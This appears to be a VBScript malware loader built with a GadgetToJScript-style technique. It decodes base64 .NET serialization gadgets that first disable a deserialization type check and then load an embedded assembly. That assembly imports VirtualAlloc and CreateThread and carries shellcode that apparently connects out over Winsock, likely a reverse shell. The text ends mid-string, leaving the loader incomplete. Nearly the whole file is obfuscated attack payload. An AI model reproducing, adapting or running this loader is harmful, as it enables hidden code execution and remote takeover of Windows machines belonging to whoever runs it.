Function b64Decode(ByVal enc)
    Dim xmlObj, nodeObj
    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
    Set nodeObj = xmlObj.CreateElement("base64")
    nodeObj.dataType = "bin.base64"
    nodeObj.Text = enc
    b64Decode = nodeObj.nodeTypedValue
    Set nodeObj = Nothing
    Set xmlObj = Nothing
End Function

Function Exec()
    
	Dim stage_1, stage_2

    stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
stage_1 = stage_1 & "L3hhbWwvcHJlc2VudGF0aW9uIg0KICAgICAgICAgICAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5m"
stage_1 = stage_1 & "eC8yMDA2L3hhbWwiDQogICAgICAgICAgICB4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIN"
stage_1 = stage_1 & "CiAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNv"
stage_1 = stage_1 & "bmZpZ3VyYXRpb24iDQogICAgICAgICAgICB4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5"
stage_1 = stage_1 & "PW1zY29ybGliIj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7"
stage_1 = stage_1 & "eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3Zp"
stage_1 = stage_1 & "ZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNv"
stage_1 = stage_1 & "bXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwg"
stage_1 = stage_1 & "Q3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQ"
stage_1 = stage_1 & "cm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9"
stage_1 = stage_1 & "IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0"
stage_1 = stage_1 & "RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFj"
stage_1 = stage_1 & "dGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHI6Qmlu"
stage_1 = stage_1 & "ZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0"
stage_1 = stage_1 & "aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2Jq"
stage_1 = stage_1 & "ZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2RO"
stage_1 = stage_1 & "YW1lPSJTZXRWYWx1ZSI+DQogICAgICAgICAgICAgICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4N"
stage_1 = stage_1 & "CiAgICAgICAgICAgICAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpCb29sZWFuPnRy"
stage_1 = stage_1 & "dWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4N"
stage_1 = stage_1 & "CiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVy"
stage_1 = stage_1 & "IHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0"
stage_1 = stage_1 & "aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBh"
stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="

    
    stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMczAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
stage_2 = stage_2 & "AAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMA"
stage_2 = stage_2 & "AAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1"
stage_2 = stage_2 & "bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25l"
stage_2 = stage_2 & "bnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlh"
stage_2 = stage_2 & "bGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAA"
stage_2 = stage_2 & "AAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkY"
stage_2 = stage_2 & "AAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNv"
stage_2 = stage_2 & "bGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNp"
stage_2 = stage_2 & "emUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhh"
stage_2 = stage_2 & "c2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJHwAAAAkgAAAADw0AAAAAFgAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUg"
stage_2 = stage_2 & "cnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwCFJYn7AAAAAAAAAADgACIgCwEwAAAOAAAABgAAAAAAABYsAAAAIAAA"
stage_2 = stage_2 & "AEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAA"
stage_2 = stage_2 & "AAAAAADBKwAATwAAAABAAACYAwAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAHCsAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAIQNAAAAIAAAAA4AAAACAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAgAABgLnJzcmMAAACYAwAAAEAAAAAEAAAAEAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAA"
stage_2 = stage_2 & "ABQAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAA9SsAAAAAAABIAAAAAgAFAAwhAAAQCgAAAQAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATMAYAlgAAAAEAABECKBAAAAoAAHIBAABwKBEAAAomIGIB"
stage_2 = stage_2 & "AACNFQAAASXQBAAABCgSAAAKChYoEwAACgaOaX4BAAAEfgIAAAQoAgAABgsGFgcGjmkoFAAACgAHBo5pfgMAAAQSAigDAAAGJn4V"
stage_2 = stage_2 & "AAAKDRYTBH4VAAAKEwUWFgcRBRYSBCgEAAAGDSCIEwAAKBYAAAoAchEAAHAoEQAACiYrACpiIAAQAACAAQAABBqAAgAABB8QgAMA"
stage_2 = stage_2 & "AAQqAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAFwDAAAjfgAAyAMAALQEAAAjU3RyaW5ncwAAAAB8CAAAIAAA"
stage_2 = stage_2 & "ACNVUwCcCAAAEAAAACNHVUlEAAAArAgAAGQBAAAjQmxvYgAAAAAAAAACAAABV5UCNAkCAAAA+gEzABYAAAEAAAAbAAAABAAAAAQA"
stage_2 = stage_2 & "AAAGAAAAEAAAABYAAAAPAAAAAQAAAAEAAAABAAAABAAAAAEAAAABAAAAAgAAAAEAAAAAAOwCAQAAAAAABgARApADBgB+ApADBgBF"
stage_2 = stage_2 & "AU8DDwCwAwAABgBtARIDBgD0ARIDBgDVARIDBgBlAhIDBgAxAhIDBgBKAhIDBgCEARIDBgBZAXEDBgA3AXEDBgC4ARIDBgCfAcoC"
stage_2 = stage_2 & "BgAsBAsDBgAcAZADBgABAQsDCgCGBOIDCgB0BOIDBgCcAgsDBgD3A5ADBgCbBAsDBgDmAAsDBgBIAwsDBgDkAnEDBgDfALkCAAAA"
stage_2 = stage_2 & "AGkAAAAAAAEAAQABABAAAwOhBEEAAQABAAABAAByAAAAQQAEAAcAEwEAAAoAAABJAAUABwARAK0AUQARAJEAUQARAKAAUQAzASgA"
stage_2 = stage_2 & "VABQIAAAAACGGDsDBgABAAAAAACAAJEgwQBYAAEAAAAAAIAAkSBCBGAABQAAAAAAgACRINkAaQAJAAAAAACAAJEgHwR0AA8A8iAA"
stage_2 = stage_2 & "AAAAkRhBA3oAEQAAAAEALwMAAAIAtAIAAAMACwEAAAQAUQQAAAEABgQAAAIArQIAAAMAWwQCAAQAMwQAAAEAvwMAAAIAoQIAAAMA"
stage_2 = stage_2 & "EAQAAAQA/QIAAAUA0gMAAAYAzgAAAAEA+QAAAAIAYgMJADsDAQARADsDBgAZADsDCgApADsDEAAxADsDEAA5ADsDEABBADsDEABJ"
stage_2 = stage_2 & "ADsDEABRADsDEABZADsDEABhADsDFQBpADsDEABxADsDEAB5ADsDEACJADsDBgCBADsDBgCZAIEEJACxAJEEKgDJAGgEMgDRAK4E"
stage_2 = stage_2 & "NwDJACQDQADZACkDQwAuAAsAfgAuABMAhwAuABsApgAuACMArwAuACsAwQAuADMAwQAuADsAwQAuAEMArwAuAEsAxwAuAFMAwQAu"
stage_2 = stage_2 & "AFsAwQAuAGMA3wAuAGsACQEuAHMAFgFjAHsAXgEBAGIBAAAEABoAAQAAAQUAwQABAAABBwBCBAEAAAEJANkAAQAAAQsAHwQBABws"
stage_2 = stage_2 & "AAAEAASAAAABAAAAAAAAAAAAAAAAAKEEAAAEAAAAAAAAAAAAAABIALgAAAAAAAQAAAAAAAAAAAAAAEgA4gMAAAAABAADAAAAAGtl"
stage_2 = stage_2 & "cm5lbDMyAF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9MzU0ADZDNjQzQTdGQkJGODExNTgxMTlFOEU2RDJFNzRFNDREQUZBNzky"
stage_2 = stage_2 & "Mzk2QkIzNTI4MEM3NjEzMjJFQzVEM0VENzYAPE1vZHVsZT4APFByaXZhdGVJbXBsZW1lbnRhdGlvbkRldGFpbHM+AFBBR0VfUkVB"
stage_2 = stage_2 & "RFdSSVRFAFBBR0VfRVhFQ1VURQBNRU1fQ09NTUlUAG1zY29ybGliAFZpcnR1YWxBbGxvYwBscFRocmVhZElkAENyZWF0ZVRocmVh"
stage_2 = stage_2 & "ZABSdW50aW1lRmllbGRIYW5kbGUAaEhhbmRsZQBWYWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBDb21waWxlckdlbmVyYXRlZEF0"
stage_2 = stage_2 & "dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxl"
stage_2 = stage_2 & "QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVW"
stage_2 = stage_2 & "ZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRl"
stage_2 = stage_2 & "AENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0"
stage_2 = stage_2 & "QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U3Rh"
stage_2 = stage_2 & "Y2tTaXplAGR3U2l6ZQBzaXplAFN5c3RlbS5UaHJlYWRpbmcAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBNYXJzaGFsAFRlc3RB"
stage_2 = stage_2 & "c3NlbWJseS5kbGwAcGFyYW0AUHJvZ3JhbQBTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBTbGVlcABscFN0YXJ0QWRkcgAu"
stage_2 = stage_2 & "Y3RvcgAuY2N0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9w"
stage_2 = stage_2 & "U2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBscFRocmVhZEF0dHJpYnV0ZXMA"
stage_2 = stage_2 & "ZHdDcmVhdGlvbkZsYWdzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAFJ1bnRpbWVIZWxwZXJzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVz"
stage_2 = stage_2 & "cwBXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwZmxPbGRQcm90ZWN0AFZpcnR1YWxQcm90ZWN0AGZsUHJvdGVjdABmbE5ld1Byb3RlY3QA"
stage_2 = stage_2 & "b3BfRXhwbGljaXQARGlhbG9nUmVzdWx0AFNob3cATWVzc2FnZUJveABJbml0aWFsaXplQXJyYXkAVGVzdEFzc2VtYmx5AENvcHkA"
stage_2 = stage_2 & "AAAPUwB0AGEAcgB0ACEAIQAAC0UAbgBkACEAIQAAAAAA/A8CYlrD8kSMHFqnJNBVcwAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQEC"
stage_2 = stage_2 & "CQcGHQUYCRgJGAUAARFRDgcAAgESXRFhBAABGAgIAAQBHQUIGAgCBhgEAAEBCAi3elxWGTTgiQIGCQMGERAHAAQYGAkJCQgABAIY"
stage_2 = stage_2 & "CAkQCQoABhgJCRgYCRAJBQACCRgJAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAR"
stage_2 = stage_2 & "AQAMVGVzdEFzc2VtYmx5AAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDIwAAApAQAkYjJiM2FkYjAtMTY2OS00Yjk0LTg2Y2It"
stage_2 = stage_2 & "NmRkNjgyZGRiZWEzAAAMAQAHMS4wLjAuMAAARwEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC4wAQBUDhRGcmFtZXdvcmtEaXNw"
stage_2 = stage_2 & "bGF5TmFtZRAuTkVUIEZyYW1ld29yayA0BAEAAAAAAAAAAJyjdPwAAAAAAgAAAG0AAABUKwAAVA0AAAAAAAAAAAAAAAAAABAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAABSU0RTm2QSERWz2kWLNrzQDbp8UwEAAABDOlxVc2Vyc1xkZmdmZGdcU291cmNlXFJlcG9zXEdhZGdldFRvSlNj"
stage_2 = stage_2 & "cmlwdFxUZXN0QXNzZW1ibHlcb2JqXERlYnVnXFRlc3RBc3NlbWJseS5wZGIA6SsAAAAAAAAAAAAAAywAAAAgAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAPUrAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAAAAAP8lACAAEPzojwAAAGCJ5THSZItS"
stage_2 = stage_2 & "MItSDItSFItyKDH/D7dKJjHArDxhfAIsIMHPDQHHSXXvUotSEFeLQjwB0ItAeIXAdEwB0ItIGItYIAHTUIXJdDwx/0mLNIsB1jHA"
stage_2 = stage_2 & "wc8NrAHHOOB19AN9+Dt9JHXgWItYJAHTZosMS4tYHAHTiwSLAdCJRCQkW1thWVpR/+BYX1qLEumA////XWgzMgAAaHdzMl9UaEx3"
stage_2 = stage_2 & "JgeJ6P/QuJABAAApxFRQaCmAawD/1WoKaMCoRoFoAgD28InmUFBQUEBQQFBo6g/f4P/Vl2oQVldomaV0Yf/VhcB0Cv9OCHXs6GcA"
stage_2 = stage_2 & "AABqAGoEVldoAtnIX//Vg/gAfjaLNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9WD+AB9KFhoAEAAAGoAUGgLLw8w/9VX"
stage_2 = stage_2 & "aHVuTWH/1V5e/wwkD4Vw////6Zv///8BwynGdcHDu/C1olZqAFP/1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAEAAAAAAEgAAABYQAAAPAMAAAAAAAAAAAAAPAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E"
stage_2 = stage_2 & "7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBm"
stage_2 = stage_2 & "AG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYA"
stage_2 = stage_2 & "bwAAAHgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5"
stage_2 = stage_2 & "AE4AYQBtAGUAAAAAAAAAAABCAA0AAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAVABlAHMAdABBAHMAcwBlAG0A"
stage_2 = stage_2 & "YgBsAHkAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAAEIAEQABAEkAbgB0AGUAcgBu"
stage_2 = stage_2 & "AGEAbABOAGEAbQBlAAAAVABlAHMAdABBAHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkA"
stage_2 = stage_2 & "cgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAwAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBt"
stage_2 = stage_2 & "AGEAcgBrAHMAAAAAAAAAAABKABEAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAVABlAHMAdABBAHMAcwBlAG0A"
stage_2 = stage_2 & "YgBsAHkALgBkAGwAbAAAAAAAOgANAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABUAGUAcwB0AEEAcwBzAGUAbQBiAGwAeQAA"
stage_2 = stage_2 & "AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwA"
stage_2 = stage_2 & "eQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwA"
stage_2 = stage_2 & "AAAYPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEDwAAAB9TeXN0ZW0uVW5pdHlT"
stage_2 = stage_2 & "ZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBiEAAAD+AVN5c3RlbS5MaW5xLkVu"
stage_2 = stage_2 & "dW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249"
stage_2 = stage_2 & "NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rp"
stage_2 = stage_2 & "b24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3"
stage_2 = stage_2 & "YTVjNTYxOTM0ZTA4OV1dBAAAAAYiAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVi"
stage_2 = stage_2 & "bGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAQAAAABwAAAAkDAAAACgkkAAAACggIAAAAAAoICAEAAAABEQAAAA8AAAAGJQAA"
stage_2 = stage_2 & "APUCU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uUmVmbGVjdGlv"
stage_2 = stage_2 & "bi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
stage_2 = stage_2 & "NWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29y"
stage_2 = stage_2 & "bGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBt"
stage_2 = stage_2 & "c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODld"
stage_2 = stage_2 & "XQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51"
stage_2 = stage_2 & "bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVy"
